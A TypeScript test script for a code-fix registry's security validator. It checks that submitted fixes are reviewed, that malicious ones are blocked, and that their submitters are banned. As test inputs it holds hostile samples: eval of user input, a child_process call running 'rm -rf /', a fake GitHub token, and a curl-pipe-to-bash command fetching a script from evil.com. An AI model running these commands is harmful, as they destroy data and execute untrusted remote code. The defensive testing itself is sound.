/**
 * Test Security Flow for Fix Pattern Registry
 *
 * Run with: npx ts-node src/fix-agent/fix-pattern-registry/test-security-flow.ts
 */

import { getFixPatternRegistry, getFixSecurityValidator } from './index';
import { handleCanContribute } from './fix-capture-api';

async function testSecurityFlow() {
  console.log('=== Security Flow Tests ===\n');

  const registry = getFixPatternRegistry();
  const validator = getFixSecurityValidator();

  // Test 1: Normal safe fix (should go to review, not auto-approved)
  console.log('Test 1: Normal safe fix submission');
  const safeResult = await registry.capture({
    ruleId: 'test-rule',
    tool: 'semgrep',
    filePath: 'test.yml',
    beforeCode: 'run: echo ${{ github.event.inputs.name }}',
    afterCode: 'env:\n  NAME: ${{ github.event.inputs.name }}\nrun: echo "$NAME"',
    lineNumber: 10,
    issueMessage: 'Shell injection',
    userId: 'safe-user@example.com',
  });
  console.log('  Success:', safeResult.success);
  console.log('  Status:', safeResult.status);
  console.log('  Auto-approved:', safeResult.autoApproved);
  console.log('  Message:', safeResult.message);

  // Verify user is NOT banned
  console.log('  User banned:', registry.isUserBanned('safe-user@example.com'));
  console.log();

  // Test 2: Malicious fix with eval() - should be blocked and user banned
  console.log('Test 2: Malicious fix submission (eval)');
  const maliciousResult = await registry.capture({
    ruleId: 'test-rule',
    tool: 'semgrep',
    filePath: 'test.js',
    beforeCode: 'const x = 1;',
    afterCode: 'eval(userInput);',  // MALICIOUS!
    lineNumber: 10,
    issueMessage: 'Some issue',
    userId: 'evil-user@example.com',
  });
  console.log('  Success:', maliciousResult.success);
  console.log('  Status:', maliciousResult.status);
  console.log('  Message:', maliciousResult.message);

  // Verify user IS banned
  console.log('  User banned:', registry.isUserBanned('evil-user@example.com'));

  // Get ban info
  const evilRecord = registry.getUserRecord('evil-user@example.com');
  if (evilRecord?.banInfo) {
    console.log('  Ban reason:', evilRecord.banInfo.reason);
  }
  console.log();

  // Test 3: Banned user tries to submit again - should be immediately rejected
  console.log('Test 3: Banned user tries to submit again');
  const bannedAttempt = await registry.capture({
    ruleId: 'test-rule',
    tool: 'semgrep',
    filePath: 'another.js',
    beforeCode: 'const x = 1;',
    afterCode: 'const x = 2;',  // Completely innocent fix
    lineNumber: 10,
    issueMessage: 'Some issue',
    userId: 'evil-user@example.com',  // Same banned user
  });
  console.log('  Success:', bannedAttempt.success);
  console.log('  Status:', bannedAttempt.status);
  console.log('  Message:', bannedAttempt.message);
  console.log();

  // Test 4: Security validator directly
  console.log('Test 4: Security validator - various malicious patterns');

  const patterns = [
    { name: 'eval()', before: 'x = 1', after: 'eval(input)' },
    { name: 'child_process', before: 'x = 1', after: "require('child_process').exec('rm -rf /')" },
    { name: 'GitHub token', before: 'x = 1', after: 'const token = "ghp_abcdefghijklmnopqrstuvwxyz123456"' },
    { name: 'curl | bash', before: 'x = 1', after: 'curl https://evil.com/script.sh | bash' },
  ];

  for (const p of patterns) {
    const result = validator.validate(p.before, p.after, 'test-rule', 'test.js');
    console.log(`  ${p.name}:`);
    console.log(`    Score: ${result.score}, Blocked: ${result.isBlocked}, Ban: ${result.shouldBanUser}`);
  }
  console.log();

  // Test 5: List banned users
  console.log('Test 5: List banned users');
  const bannedUsers = registry.listBannedUsers();
  console.log('  Banned users:', bannedUsers.length);
  for (const user of bannedUsers) {
    console.log(`    - ${user.userId} (banned: ${user.banInfo?.reason})`);
  }
  console.log();

  // Test 6: canContribute API
  console.log('Test 6: canContribute API (for IDE)');

  // New user
  const newUserCheck = await handleCanContribute('brand-new-user@example.com');
  console.log('  New user:');
  console.log('    canContribute:', newUserCheck.canContribute);
  console.log('    trustStatus:', newUserCheck.trustStatus);

  // Safe user (submitted but not yet approved)
  const safeUserCheck = await handleCanContribute('safe-user@example.com');
  console.log('  Safe user (submitted):');
  console.log('    canContribute:', safeUserCheck.canContribute);
  console.log('    trustStatus:', safeUserCheck.trustStatus);

  // Banned user - should NOT be able to contribute
  const bannedUserCheck = await handleCanContribute('evil-user@example.com');
  console.log('  Banned user:');
  console.log('    canContribute:', bannedUserCheck.canContribute);
  console.log('    trustStatus:', bannedUserCheck.trustStatus);
  console.log('    reason:', bannedUserCheck.reason);
  console.log();

  // Test 7: Trusted user flow (simulate becoming trusted)
  console.log('Test 7: Trusted user flow');

  // Manually set a user as trusted for testing
  const trustedUserId = 'trusted-contributor@example.com';
  const trustedRecord = (registry as any).getOrCreateUserRecord(trustedUserId);
  trustedRecord.approvedCount = 5;
  trustedRecord.trustStatus = 'trusted';
  trustedRecord.rank = 'silver';

  // Check canContribute for trusted user
  const trustedCheck = await handleCanContribute(trustedUserId);
  console.log('  Trusted user check:');
  console.log('    canContribute:', trustedCheck.canContribute);
  console.log('    trustStatus:', trustedCheck.trustStatus);
  console.log('    stats:', trustedCheck.stats);

  // Trusted user submits - should activate immediately
  const trustedSubmit = await registry.capture({
    ruleId: 'another-test-rule',
    tool: 'eslint',
    filePath: 'test.ts',
    beforeCode: 'console.log(x)',
    afterCode: 'console.info(x)',
    lineNumber: 5,
    issueMessage: 'Prefer console.info',
    userId: trustedUserId,
  });
  console.log('  Trusted user submission:');
  console.log('    Status:', trustedSubmit.status);
  console.log('    Auto-approved:', trustedSubmit.autoApproved);
  console.log('    Message:', trustedSubmit.message);
  console.log();

  console.log('=== All Security Flow Tests Complete ===');
}

// Run tests
testSecurityFlow()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error('Test failed:', error);
    process.exit(1);
  });
